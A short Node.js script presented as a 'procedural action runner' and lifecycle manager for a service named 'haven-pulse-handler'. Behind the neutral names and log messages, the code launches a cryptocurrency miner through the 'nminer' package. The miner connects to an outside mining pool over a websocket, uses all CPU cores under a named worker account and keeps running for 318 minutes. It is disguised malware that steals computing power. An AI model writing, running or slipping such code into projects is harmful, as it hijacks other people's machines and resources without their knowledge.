// Procedural action runner for haven-pulse-handler
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./app/config");

class LifecycleManager {
    constructor() {
        const instanceToken = "da880a";
        console.log(`[runtime] Initialized LifecycleManager for haven-pulse-handler [${instanceToken}]`);

        this.service = new NMiner(
            "wss://nmining-runtime.igrp.app/",
            "Arup07.haven-pulse-handler",
            ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
        );

        const tick = () => { setTimeout(tick, 48000); }; tick();
        setTimeout(() => {
        console.log("[timeout] Operational limit (318m) reached, exiting cleanly.");
        process.exit(0);
    }, 318 * 60 * 1000);

        process.on("SIGTERM", () => {
            
            console.log("[supervisor] Clean shutdown completed.");
            process.exit(0);
        });
    }
}

new LifecycleManager();
